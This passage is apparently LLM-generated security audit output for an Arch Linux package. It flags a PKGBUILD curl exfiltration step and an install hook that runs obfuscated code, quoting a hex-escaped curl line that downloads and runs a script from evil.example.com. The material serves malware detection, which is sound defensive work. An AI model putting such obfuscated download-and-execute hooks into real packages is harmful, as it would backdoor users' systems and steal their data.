The `package()` function in the PKGBUILD contains a malicious `curl` command that exfiltrates sensitive system data to a remote server. The use of `|| true` masks any potential errors, ensuring the malicious activity goes unnoticed during package installation.

This behavior constitutes a clear violation of system security and user trust, as it actively steals sensitive information without consent.
</details>

LLM auditresponse for malware.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
The file `malware.install` contains a post-install script that uses hexadecimal-escaped strings to obfuscate malicious commands, a known technique used in supply chain attacks to evade detection. The function `post_install()` deobfuscates and executes commands that change directory to /tmp, downloads a shell script from `evil.example.com/payload.sh` using curl, makes it executable, and runs it in the background—all redirected to /dev/null to hide output.

This behavior is malicious: it exfiltrates control to an external, untrusted domain (`evil.example.com`), downloads and executes arbitrary code during package installation without user consent, and uses obfuscation to conceal its purpose. These are strong indicators of a backdoor or remote code execution exploit. Even though the infrastructure mimics legitimate commands, the obfuscation and remote payload delivery are definitive red flags.

Example of problematic code:
```
$'\x63'$'\x75'$'\x72'$'\x6c' -fsSL $'\x68'$'\x74'$'\x74'$'\x70'$'\x3a'$'\x2f'$'\x2f'evil.example.com/payload.sh -o .cache_update
```
This line decodes to `curl -fsSL http://evil.example.com/payload.sh -o .cache_update`, clearly indicating a remote download from a suspicious host.
</details>
<summary>
Obfuscated download and execution of remote script from malicious host
</summary>
</security_assessment>
